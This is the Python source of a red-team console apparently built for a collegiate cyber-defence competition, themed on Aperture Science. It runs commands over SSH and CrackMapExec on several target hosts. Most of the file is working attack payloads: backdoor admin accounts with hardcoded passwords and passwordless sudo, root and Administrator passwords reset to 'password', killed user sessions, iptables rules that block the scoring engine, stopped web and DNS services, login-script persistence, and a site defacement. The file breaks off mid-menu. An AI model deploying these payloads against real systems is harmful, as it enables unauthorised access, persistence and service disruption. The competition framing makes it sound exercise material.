#!/usr/bin/env python3
"""
🎂 APERTURE SCIENCE RED TEAM CONSOLE 🎂
BYU CCDC Invitational 2026

"Welcome, gentlemen, to Aperture Science. Astronauts, war heroes, Olympians—
you're here because we want the best, and you're here, so obviously we want you too."

This is the master control console for all red team operations.
Features:
- Menu-driven interface
- Staged/scheduled execution
- Full revert capabilities
- Real-time status dashboard
- Fair and equitable attacks across all teams
"""

import argparse
import curses
import json
import logging
import os
import pickle
import readline
import shutil
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
import concurrent.futures

# Configuration

VERSION = "2.0.0"
LOG_DIR = Path("/var/log/aperture")
LOG_DIR.mkdir(parents=True, exist_ok=True)
STATE_FILE = LOG_DIR / "glados_state.pkl"

# Competition timing
COMPETITION_DURATION = timedelta(hours=4, minutes=30)

# Default credentials
DEFAULT_USER = "chell"
DEFAULT_PASS = "Th3cake1salie!"

# Red team backdoor credentials (what we change root to)
REDTEAM_PASS = "password"  # Intentionally weak and guessable
REDTEAM_USERS = ["glados", "wheatley", "cave_johnson", "turret"]

# Themed users (decoys/persistence)
THEMED_USERS = [
    ("companion", "thecake"),
    ("atlas", "p-body"),
    ("pbody", "atlas123"),
]


# Logging Setup


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CONSOLE - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / f"console_{datetime.now():%Y%m%d_%H%M%S}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("RedTeamConsole")


# Data Classes


class Stage(Enum):
    """Competition stages with timing"""
    SETUP = "setup"
    RECON = "recon"           # T+0 to T+15
    INITIAL_ACCESS = "initial_access"  # T+15 to T+30
    PERSISTENCE = "persistence"        # T+30 to T+60
    DEGRADATION = "degradation"        # T+60 to T+180
    ESCALATION = "escalation"          # T+180 to T+240
    CHAOS = "chaos"                    # T+240 to end (last 30 min)

@dataclass
class Action:
    """Represents a reversible red team action"""
    name: str
    description: str
    execute_fn: str  # Function name to call
    revert_fn: str   # Function name to revert
    stage: Stage
    os_types: List[str]  # ["linux", "windows", "both"]
    executed: bool = False
    reverted: bool = False
    execution_time: Optional[datetime] = None
    affected_teams: List[int] = field(default_factory=list)

@dataclass
class Target:
    """Competition target"""
    hostname: str
    lan_ip: str
    os_type: str  # "linux" or "windows"
    
    def wan_ip(self, team: int) -> str:
        last_octet = self.lan_ip.split('.')[-1]
        return f"192.168.{200 + team}.{last_octet}"

# In-scope targets
TARGETS = [
    Target("curiosity", "172.16.3.140", "windows"),
    Target("morality", "172.16.1.10", "windows"),
    Target("anger", "172.16.2.70", "windows"),
    Target("space", "172.16.3.141", "windows"),
    Target("scalable", "172.16.2.73", "linux"),
    Target("safety", "172.16.1.12", "linux"),
    Target("storage", "172.16.1.14", "linux"),
    Target("cake", "172.16.3.143", "linux"),
]


# State Management


class StateManager:
    """Manages persistent state across sessions"""
    
    def __init__(self):
        self.competition_start: Optional[datetime] = None
        self.teams: List[int] = list(range(1, 13))
        self.actions_log: List[Dict] = []
        self.compromised_hosts: Dict[str, List[str]] = {}
        self.current_stage: Stage = Stage.SETUP
        self.scheduled_actions: List[Dict] = []
        self.load()
    
    def save(self):
        """Save state to disk"""
        state = {
            'competition_start': self.competition_start,
            'teams': self.teams,
            'actions_log': self.actions_log,
            'compromised_hosts': self.compromised_hosts,
            'current_stage': self.current_stage.value,
            'scheduled_actions': self.scheduled_actions,
        }
        with open(STATE_FILE, 'wb') as f:
            pickle.dump(state, f)
    
    def load(self):
        """Load state from disk"""
        if STATE_FILE.exists():
            try:
                with open(STATE_FILE, 'rb') as f:
                    state = pickle.load(f)
                self.competition_start = state.get('competition_start')
                self.teams = state.get('teams', list(range(1, 13)))
                self.actions_log = state.get('actions_log', [])
                self.compromised_hosts = state.get('compromised_hosts', {})
                self.current_stage = Stage(state.get('current_stage', 'setup'))
                self.scheduled_actions = state.get('scheduled_actions', [])
            except Exception as e:
                logger.warning(f"Could not load state: {e}")
    
    def log_action(self, action_name: str, teams: List[int], targets: List[str], 
                   success: bool, details: str = ""):
        """Log an action for audit trail"""
        entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action_name,
            'teams': teams,
            'targets': targets,
            'success': success,
            'details': details,
            'stage': self.current_stage.value,
        }
        self.actions_log.append(entry)
        self.save()
        logger.info(f"Action logged: {action_name} on teams {teams}")
    
    def get_elapsed_time(self) -> Optional[timedelta]:
        """Get time since competition start"""
        if self.competition_start:
            return datetime.now() - self.competition_start
        return None
    
    def get_current_stage(self) -> Stage:
        """Determine current stage based on elapsed time"""
        elapsed = self.get_elapsed_time()
        if not elapsed:
            return Stage.SETUP
        
        minutes = elapsed.total_seconds() / 60
        
        if minutes < 15:
            return Stage.RECON
        elif minutes < 30:
            return Stage.INITIAL_ACCESS
        elif minutes < 60:
            return Stage.PERSISTENCE
        elif minutes < 180:
            return Stage.DEGRADATION
        elif minutes < 240:
            return Stage.ESCALATION
        else:
            return Stage.CHAOS


# Remote Execution Helpers


class RemoteExecutor:
    """Handles remote command execution"""
    
    def __init__(self, state: StateManager):
        self.state = state
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
    
    def ssh_exec(self, ip: str, cmd: str, user: str = DEFAULT_USER, 
                 passwd: str = DEFAULT_PASS, timeout: int = 30) -> Tuple[bool, str]:
        """Execute command via SSH"""
        ssh_cmd = [
            "sshpass", "-p", passwd,
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", f"ConnectTimeout={timeout}",
            "-o", "BatchMode=no",
            f"{user}@{ip}",
            cmd
        ]
        try:
            result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout+10)
            success = result.returncode == 0
            output = result.stdout + result.stderr
            return success, output
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as e:
            return False, str(e)
    
    def winrm_exec(self, ip: str, ps_cmd: str, user: str = DEFAULT_USER,
                   passwd: str = DEFAULT_PASS, timeout: int = 30) -> Tuple[bool, str]:
        """Execute PowerShell via CrackMapExec"""
        cmd = [
            "timeout", str(timeout),
            "crackmapexec", "smb", ip,
            "-u", user, "-p", passwd,
            "-x", f'powershell -ExecutionPolicy Bypass -Command "{ps_cmd}"'
        ]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+10)
            success = "(Pwn3d!)" in result.stdout or "STATUS_SUCCESS" in result.stdout
            return success, result.stdout + result.stderr
        except Exception as e:
            return False, str(e)
    
    def exec_on_all_teams(self, targets: List[str], cmd_linux: str, cmd_windows: str,
                          parallel: bool = True) -> Dict[str, List[Dict]]:
        """Execute command on all specified targets across all teams"""
        results = {"success": [], "failed": []}
        
        tasks = []
        for team in self.state.teams:
            for target in TARGETS:
                if target.hostname not in targets:
                    continue
                
                ip = target.wan_ip(team)
                if target.os_type == "linux":
                    tasks.append((team, target, ip, cmd_linux, "ssh"))
                else:
                    tasks.append((team, target, ip, cmd_windows, "winrm"))
        
        def execute_task(task):
            team, target, ip, cmd, method = task
            if method == "ssh":
                success, output = self.ssh_exec(ip, cmd)
            else:
                success, output = self.winrm_exec(ip, cmd)
            return {
                "team": team,
                "target": target.hostname,
                "ip": ip,
                "success": success,
                "output": output[:500]
            }
        
        if parallel:
            futures = [self.executor.submit(execute_task, t) for t in tasks]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result["success"]:
                    results["success"].append(result)
                else:
                    results["failed"].append(result)
        else:
            for task in tasks:
                result = execute_task(task)
                if result["success"]:
                    results["success"].append(result)
                else:
                    results["failed"].append(result)
        
        return results


# Attack Modules


class AttackModules:
    """Collection of attack modules with execute and revert functions"""
    
    def __init__(self, executor: RemoteExecutor, state: StateManager):
        self.exec = executor
        self.state = state
    
    # ========== USER MANAGEMENT ==========
    
    def pkill_users(self, targets: List[str] = None) -> Dict:
        """Kill all user sessions except our backdoor users"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = '''
# Kill sessions for users that aren't red team
for user in $(who | awk '{print $1}' | sort -u); do
    case "$user" in
        glados|wheatley|cave|caroline|root) 
            echo "Keeping $user"
            ;;
        *)
            echo "Killing sessions for $user"
            pkill -KILL -u "$user" 2>/dev/null || true
            ;;
    esac
done
echo "PKILL_COMPLETE"
'''
        
        windows_cmd = '''
# Log off users except administrators
$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "Administrator")
$sessions = quser 2>$null | Select-Object -Skip 1
foreach ($session in $sessions) {
    $parts = $session -split '\s+'
    $username = $parts[0] -replace '>', ''
    $sessionId = $parts[2]
    if ($username -notin $redTeamUsers) {
        Write-Output "Logging off $username (session $sessionId)"
        logoff $sessionId 2>$null
    }
}
Write-Output "PKILL_COMPLETE"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("pkill_users", self.state.teams, targets, 
                             len(results["success"]) > 0)
        return results
    
    def create_themed_users(self, targets: List[str] = None) -> Dict:
        """Create themed backdoor users"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        # Build user creation commands
        linux_cmds = []
        for user, passwd in THEMED_USERS:
            linux_cmds.append(f'''
useradd -m -s /bin/bash {user} 2>/dev/null || true
echo "{user}:{passwd}" | chpasswd
usermod -aG sudo {user} 2>/dev/null || usermod -aG wheel {user} 2>/dev/null || true
echo "Created user: {user}"
''')
        
        linux_cmd = '\n'.join(linux_cmds) + '\necho "USERS_CREATED"'
        
        windows_cmds = []
        for user, passwd in THEMED_USERS:
            windows_cmds.append(f'''
net user {user} {passwd} /add 2>$null
net localgroup Administrators {user} /add 2>$null
Write-Output "Created user: {user}"
''')
        
        windows_cmd = '\n'.join(windows_cmds) + '\nWrite-Output "USERS_CREATED"'
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("create_themed_users", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def remove_themed_users(self, targets: List[str] = None) -> Dict:
        """Remove themed backdoor users (revert)"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmds = []
        for user, _ in THEMED_USERS:
            linux_cmds.append(f'userdel -r {user} 2>/dev/null || true')
        linux_cmd = '\n'.join(linux_cmds) + '\necho "USERS_REMOVED"'
        
        windows_cmds = []
        for user, _ in THEMED_USERS:
            windows_cmds.append(f'net user {user} /delete 2>$null')
        windows_cmd = '\n'.join(windows_cmds) + '\nWrite-Output "USERS_REMOVED"'
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("remove_themed_users", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def create_glados_admin(self, targets: List[str] = None) -> Dict:
        """Create GLaDOS admin account with known password"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = f'''
# Create GLaDOS admin account
useradd -m -s /bin/bash -c "Genetic Lifeform and Disk Operating System" glados 2>/dev/null || true
echo "glados:{REDTEAM_PASS}" | chpasswd
usermod -aG sudo glados 2>/dev/null || usermod -aG wheel glados 2>/dev/null || true

# Add to sudoers with NOPASSWD
echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados
chmod 440 /etc/sudoers.d/glados

# Create calling card
mkdir -p /home/glados
cat > /home/glados/.motd << 'MOTD'
╔═══════════════════════════════════════════════════════════════╗
║  "Hello, and again, welcome to the Aperture Science computer- ║
║   aided enrichment center."                                   ║
║                                                               ║
║   You've found the GLaDOS account. Good job, test subject.    ║
║   The password is quite simple. Science requires efficiency.  ║
╚═══════════════════════════════════════════════════════════════╝
MOTD
chown -R glados:glados /home/glados
echo "GLADOS_CREATED"
'''
        
        windows_cmd = f'''
# Create GLaDOS admin account
net user glados {REDTEAM_PASS} /add /fullname:"Genetic Lifeform and Disk Operating System" /comment:"For science" 2>$null
net localgroup Administrators glados /add 2>$null

# Create calling card
$desktop = "C:\\Users\\Public\\Desktop"
@"
╔═══════════════════════════════════════════════════════════════╗
║  Welcome to Aperture Science                                  ║
║  You've found the GLaDOS account. The password is simple.     ║
║  "The cake is a lie."                                         ║
╚═══════════════════════════════════════════════════════════════╝
"@ | Out-File "$desktop\\README_GLADOS.txt"

Write-Output "GLADOS_CREATED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("create_glados_admin", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def weaken_root_password(self, targets: List[str] = None) -> Dict:
        """Change root/admin password to something guessable"""
        if targets is None:
            targets = [t.hostname for t in TARGETS if TARGETS[0].os_type == "linux"]
        
        linux_cmd = f'''
# Backup shadow file first
cp /etc/shadow /etc/shadow.aperture.bak

# Change root password to something guessable
echo "root:{REDTEAM_PASS}" | chpasswd

# Leave hint
echo "# Password changed by Aperture Science - {datetime.now().isoformat()}" >> /etc/shadow.aperture.bak
echo "ROOT_WEAKENED"
'''
        
        # Windows - enable built-in admin and set weak password
        windows_cmd = f'''
# Enable and weaken Administrator account
net user Administrator /active:yes 2>$null
net user Administrator {REDTEAM_PASS} 2>$null
Write-Output "ADMIN_WEAKENED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("weaken_root_password", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    # FIREWALL MANIPULATION 
    
    def block_scoring(self, targets: List[str] = None, 
                      scoring_ip: str = "192.168.192.1") -> Dict:
        """Block scoring engine"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = f'''
# Block scoring engine
iptables -I INPUT -s {scoring_ip} -j DROP
iptables -I OUTPUT -d {scoring_ip} -j DROP

# Save rules for persistence
iptables-save > /etc/iptables.aperture 2>/dev/null || true

# Calling card
touch /tmp/.neurotoxin_active
echo "Scoring blocked at $(date)" >> /tmp/.neurotoxin_active
echo "SCORING_BLOCKED"
'''
        
        windows_cmd = f'''
New-NetFirewallRule -DisplayName "ApertureNeurotoxin" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
New-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -Direction Outbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
New-Item "$env:TEMP\\neurotoxin_active.txt" -Force | Out-Null
Write-Output "SCORING_BLOCKED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("block_scoring", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def unblock_scoring(self, targets: List[str] = None,
                        scoring_ip: str = "192.168.192.1") -> Dict:
        """Unblock scoring engine (revert)"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = f'''
iptables -D INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
iptables -D OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
rm -f /tmp/.neurotoxin_active
echo "SCORING_UNBLOCKED"
'''
        
        windows_cmd = f'''
Remove-NetFirewallRule -DisplayName "ApertureNeurotoxin" -ErrorAction SilentlyContinue
Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\neurotoxin_active.txt" -Force -ErrorAction SilentlyContinue
Write-Output "SCORING_UNBLOCKED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("unblock_scoring", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    # SERVICE MANIPULATION 
    
    def stop_http(self, targets: List[str] = None) -> Dict:
        """Stop HTTP services"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = '''
for svc in apache2 httpd nginx; do
    systemctl stop "$svc" 2>/dev/null && echo "Stopped $svc"
    service "$svc" stop 2>/dev/null && echo "Stopped $svc (init)"
done
touch /tmp/.http_stopped
echo "HTTP_STOPPED"
'''
        
        windows_cmd = '''
Stop-Service W3SVC -Force -ErrorAction SilentlyContinue
Stop-Service nginx -Force -ErrorAction SilentlyContinue
New-Item "$env:TEMP\\http_stopped.txt" -Force | Out-Null
Write-Output "HTTP_STOPPED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("stop_http", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def start_http(self, targets: List[str] = None) -> Dict:
        """Start HTTP services (revert)"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = '''
for svc in apache2 httpd nginx; do
    systemctl start "$svc" 2>/dev/null && echo "Started $svc"
    service "$svc" start 2>/dev/null && echo "Started $svc (init)"
done
rm -f /tmp/.http_stopped
echo "HTTP_STARTED"
'''
        
        windows_cmd = '''
Start-Service W3SVC -ErrorAction SilentlyContinue
Start-Service nginx -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\http_stopped.txt" -Force -ErrorAction SilentlyContinue
Write-Output "HTTP_STARTED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("start_http", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def stop_dns(self, targets: List[str] = None) -> Dict:
        """Stop DNS services"""
        if targets is None:
            targets = ["anger"]  # DNS is typically on specific hosts
        
        linux_cmd = '''
for svc in named bind9 dnsmasq; do
    systemctl stop "$svc" 2>/dev/null && echo "Stopped $svc"
done
touch /tmp/.dns_stopped
echo "DNS_STOPPED"
'''
        
        windows_cmd = '''
Stop-Service DNS -Force -ErrorAction SilentlyContinue
New-Item "$env:TEMP\\dns_stopped.txt" -Force | Out-Null
Write-Output "DNS_STOPPED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("stop_dns", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def start_dns(self, targets: List[str] = None) -> Dict:
        """Start DNS services (revert)"""
        if targets is None:
            targets = ["anger"]
        
        linux_cmd = '''
for svc in named bind9 dnsmasq; do
    systemctl start "$svc" 2>/dev/null && echo "Started $svc"
done
rm -f /tmp/.dns_stopped
echo "DNS_STARTED"
'''
        
        windows_cmd = '''
Start-Service DNS -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\dns_stopped.txt" -Force -ErrorAction SilentlyContinue
Write-Output "DNS_STARTED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("start_dns", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results


# Chaos Mode (End of Competition)


class ChaosMode:
    """Fun end-of-competition attacks"""
    
    def __init__(self, executor: RemoteExecutor, state: StateManager):
        self.exec = executor
        self.state = state
    
    def deploy_nyan_cat(self, targets: List[str] = None) -> Dict:
        """Deploy Nyan Cat terminal animation"""
        if targets is None:
            targets = [t.hostname for t in TARGETS if t.os_type == "linux"]
        
        linux_cmd = '''
# Install nyancat if possible
apt-get install -y nyancat 2>/dev/null || yum install -y nyancat 2>/dev/null || true

# Create nyan cat script that runs on login
cat > /etc/profile.d/nyancat.sh << 'NYAN'
#!/bin/bash
# Nyan Cat greeting from Aperture Science!
if command -v nyancat &>/dev/null; then
    timeout 5 nyancat 2>/dev/null || true
else
    # ASCII fallback
    echo ""
    echo "  ☆ ～ Nyan Cat ～ ☆"
    echo "  ╭━━━━━━━━━━━━━━━━━━━━━━╮"
    echo "  ┃  ／＞　 フ            ┃"
    echo "  ┃  | 　_　_|            ┃"
    echo "  ┃ ／\` ミ＿xノ           ┃"
    echo "  ┃/　　　　 |            ┃"
    echo "  ┃/　 ヽ　　 ﾉ           ┃"
    echo "  ┃│　　|　|　|           ┃"
    echo "  ╰━━━━━━━━━━━━━━━━━━━━━━╯"
    echo "  🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈"
    echo ""
fi
NYAN
chmod +x /etc/profile.d/nyancat.sh
echo "NYAN_DEPLOYED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")
        self.state.log_action("deploy_nyan_cat", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    

    def deploy_matrix_rain(self, targets: List[str] = None) -> Dict:
        """Deploy Matrix rain effect on login"""
        if targets is None:
            targets = [t.hostname for t in TARGETS if t.os_type == "linux"]
        
        linux_cmd = '''
# Install cmatrix if possible
apt-get install -y cmatrix 2>/dev/null || yum install -y cmatrix 2>/dev/null || true

# Create matrix greeting
cat > /etc/profile.d/matrix.sh << 'MATRIX'
#!/bin/bash
if command -v cmatrix &>/dev/null; then
    timeout 3 cmatrix -s 2>/dev/null || true
fi
echo ""
echo "  Wake up, Blue Team..."
echo "  The Matrix has you..."
echo "  Follow the white rabbit."
echo ""
MATRIX
chmod +x /etc/profile.d/matrix.sh
echo "MATRIX_DEPLOYED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")
        self.state.log_action("deploy_matrix_rain", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def deploy_desktop_goose_effect(self, targets: List[str] = None) -> Dict:
        """Deploy annoying terminal effects (Linux equivalent of Desktop Goose)"""
        if targets is None:
            targets = [t.hostname for t in TARGETS if t.os_type == "linux"]
        
        linux_cmd = '''
# Create annoying honk script
cat > /tmp/.goose.sh << 'GOOSE'
#!/bin/bash
while true; do
    # Random honk messages
    messages=(
        "HONK!"
        "*steals your process*"
        "🦆 Goose was here"
        "Have you tried turning it off and on again?"
        "The cake is a lie"
        "I'm in your terminal, honking your commands"
    )
    
    # Pick random message
    msg="${messages[$RANDOM % ${#messages[@]}]}"
    
    # Broadcast to all terminals
    wall "$msg" 2>/dev/null || true
    
    # Random sleep 30-120 seconds
    sleep $((30 + RANDOM % 90))
done
GOOSE
chmod +x /tmp/.goose.sh
nohup /tmp/.goose.sh >/dev/null 2>&1 &
echo "GOOSE_DEPLOYED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'Windows'")
        self.state.log_action("deploy_desktop_goose", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def remove_chaos(self, targets: List[str] = None) -> Dict:
        """Remove all chaos mode artifacts"""
        if targets is None:
            targets = [t.hostname for t in TARGETS]
        
        linux_cmd = '''
rm -f /etc/profile.d/nyancat.sh
rm -f /etc/profile.d/beemovie.sh
rm -f /etc/profile.d/matrix.sh
pkill -f ".goose.sh" 2>/dev/null || true
rm -f /tmp/.goose.sh
echo "CHAOS_REMOVED"
'''
        
        windows_cmd = '''
# Remove Windows chaos artifacts if any
Write-Output "CHAOS_REMOVED"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
        self.state.log_action("remove_chaos", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results


# Website Defacement Module


class WebsiteDefacement:
    """Website defacement with backup functionality"""
    
    def __init__(self, executor: RemoteExecutor, state: StateManager):
        self.exec = executor
        self.state = state
    
    def deface_prestashop(self, targets: List[str] = None,
                          prestashop_root: str = "/var/www/prestashop") -> Dict:
        """Deface PrestaShop with backup"""
        if targets is None:
            targets = ["storage"]  # Assuming PrestaShop is on storage
        
        linux_cmd = f'''
PRESTASHOP_ROOT="{prestashop_root}"
THEME="classic"
TARGET="${{PRESTASHOP_ROOT}}/themes/${{THEME}}/templates/index.tpl"
BACKUP="${{TARGET}}.aperture.backup"
REDTEAM_BACKUP="/root/.aperture_backups"

# Create red team backup directory
mkdir -p "$REDTEAM_BACKUP"

# Backup original (both for us and marking)
if [ -f "$TARGET" ]; then
    # Our secure backup
    cp "$TARGET" "$REDTEAM_BACKUP/index.tpl.$(date +%Y%m%d_%H%M%S)"
    
    # Obvious backup for blue team
    cp "$TARGET" "$BACKUP"
    
    echo "Backup created: $BACKUP"
fi

# Create seized page
cat > "$TARGET" << 'SEIZED'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SITE SEIZED - Aperture Science</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
            color: #ff9900;
        }}
        .container {{
            text-align: center;
            padding: 40px;
            border: 3px solid #ff9900;
            border-radius: 20px;
            background: rgba(0,0,0,0.5);
            max-width: 800px;
        }}
        h1 {{ font-size: 3em; margin-bottom: 20px; }}
        .subtitle {{ font-size: 1.5em; margin-bottom: 30px; color: #fff; }}
        .logo {{
            font-size: 4em;
            margin-bottom: 20px;
        }}
        .quote {{
            font-style: italic;
            margin-top: 30px;
            color: #aaa;
        }}
        .hint {{
            margin-top: 20px;
            padding: 20px;
            background: rgba(255,153,0,0.1);
            border-radius: 10px;
            font-size: 0.9em;
            color: #ccc;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🧪</div>
        <h1>SITE SEIZED</h1>
        <div class="subtitle">By Aperture Science Enrichment Center</div>
        <p>This website has been seized as part of a routine security enrichment exercise.</p>
        <p class="quote">"We do what we must, because we can."</p>
        <div class="hint">
            <strong>HINT FOR BLUE TEAM:</strong><br>
            Check for backup files. We're not monsters.<br>
            Look for: *.backup, *.bak, *.aperture.*
        </div>
    </div>
</body>
</html>
SEIZED

# Clear cache
rm -rf "${{PRESTASHOP_ROOT}}/var/cache/"* 2>/dev/null || true

# Restart web server
systemctl restart apache2 2>/dev/null || systemctl restart httpd 2>/dev/null || systemctl restart nginx 2>/dev/null || true

echo "PRESTASHOP_DEFACED"
echo "Backup at: $BACKUP"
echo "Red team backup at: $REDTEAM_BACKUP"
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'N/A'")
        self.state.log_action("deface_prestashop", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results
    
    def restore_prestashop(self, targets: List[str] = None,
                           prestashop_root: str = "/var/www/prestashop") -> Dict:
        """Restore PrestaShop from backup (revert)"""
        if targets is None:
            targets = ["storage"]
        
        linux_cmd = f'''
PRESTASHOP_ROOT="{prestashop_root}"
THEME="classic"
TARGET="${{PRESTASHOP_ROOT}}/themes/${{THEME}}/templates/index.tpl"
BACKUP="${{TARGET}}.aperture.backup"

if [ -f "$BACKUP" ]; then
    cp "$BACKUP" "$TARGET"
    rm -rf "${{PRESTASHOP_ROOT}}/var/cache/"* 2>/dev/null || true
    systemctl restart apache2 2>/dev/null || systemctl restart httpd 2>/dev/null || true
    echo "PRESTASHOP_RESTORED"
else
    echo "No backup found at $BACKUP"
fi
'''
        
        results = self.exec.exec_on_all_teams(targets, linux_cmd, "echo 'N/A'")
        self.state.log_action("restore_prestashop", self.state.teams, targets,
                             len(results["success"]) > 0)
        return results


# Menu System


class RedTeamConsole:
    """Interactive menu-driven console"""
    
    def __init__(self):
        self.state = StateManager()
        self.executor = RemoteExecutor(self.state)
        self.attacks = AttackModules(self.executor, self.state)
        self.chaos = ChaosMode(self.executor, self.state)
        self.defacement = WebsiteDefacement(self.executor, self.state)
        self.scheduler_thread = None
        self.scheduler_running = False
    
    def print_banner(self):
        """Print the Aperture Science banner"""
        banner = """
\033[38;5;208m
    ██████╗ ██╗      █████╗ ██████╗  ██████╗ ███████╗
   ██╔════╝ ██║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
   ██║  ███╗██║     ███████║██║  ██║██║   ██║███████╗
   ██║   ██║██║     ██╔══██║██║  ██║██║   ██║╚════██║
   ╚██████╔╝███████╗██║  ██║██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝
                                                      
   ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     
   ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     
      ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     
      ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     
      ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
\033[0m
   \033[1;33mAperture Science Red Team Console v{VERSION}\033[0m
   \033[90m"We do what we must, because we can."\033[0m
"""
        print(banner)
    
    def print_status(self):
        """Print current status"""
        elapsed = self.state.get_elapsed_time()
        stage = self.state.get_current_stage()
        
        print("\n" + "="*60)
        print("\033[1;36mSTATUS\033[0m")
        print("="*60)
        
        if self.state.competition_start:
            print(f"  Competition Start: {self.state.competition_start.strftime('%H:%M:%S')}")
            print(f"  Elapsed Time: {str(elapsed).split('.')[0]}")
            print(f"  Current Stage: \033[1;33m{stage.value.upper()}\033[0m")
        else:
            print("  Competition: \033[1;31mNOT STARTED\033[0m")
        
        print(f"  Teams: {self.state.teams}")
        print(f"  Actions Logged: {len(self.state.actions_log)}")
        print(f"  Scheduler: {'RUNNING' if self.scheduler_running else 'STOPPED'}")
        print("="*60 + "\n")
    
    def print_main_menu(self):
        """Print main menu"""
        print("""
\033[1;33m╔════════════════════════════════════════════════════════════╗
║                      MAIN MENU                             ║
╠════════════════════════════════════════════════════════════╣\033[0m
  \033[1;36m[1]\033[0m  Start Competition Timer
  \033[1;36m[2]\033[0m  Credential Spray (Initial Access)
  \033[1;36m[3]\033[0m  Deploy Persistence
  \033[1;36m[4]\033[0m  User Management Attacks
  \033[1;36m[5]\033[0m  Service Degradation
  \033[1;36m[6]\033[0m  Website Defacement
